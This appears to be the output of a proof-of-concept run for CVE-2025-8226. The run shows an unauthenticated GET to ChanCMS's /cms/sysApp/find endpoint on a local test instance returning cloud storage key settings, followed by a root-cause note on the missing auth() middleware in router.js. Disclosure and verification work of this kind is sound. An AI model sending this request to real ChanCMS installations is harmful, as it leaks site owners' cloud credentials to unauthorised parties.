======================================================================
CVE-2025-8226 - ChanCMS Information Disclosure
======================================================================

Target: http://localhost:3100
Vulnerability: /cms/sysApp/find missing auth() middleware

[*] Testing unauthenticated access to system config...
----------------------------------------------------------------------
GET http://localhost:3100/cms/sysApp/find

Status Code: 200
[+] SUCCESS: Unauthenticated access to system config!

Leaked configuration:
  Type: qiniu_oss
  Key: accessKey
  Value: accessK2

[!] CRITICAL: Cloud storage credentials leaked!

[*] Verifying protected endpoint requires authentication...
----------------------------------------------------------------------
POST http://localhost:3100/cms/sysApp/update

Status Code: 200
[+] Protected endpoint correctly requires authentication
    Response: token缺失

======================================================================
RESULT: VULNERABLE

Root Cause Analysis:
  File: app/modules/cms/router.js line 19
  Code: router.get('/sysApp/find', controller.sysApp.find)
  Issue: Missing auth() middleware allows unauthenticated access

  Compare with protected endpoint (line 23):
  Code: router.post('/sysApp/update', auth(), controller.sysApp.update)
======================================================================
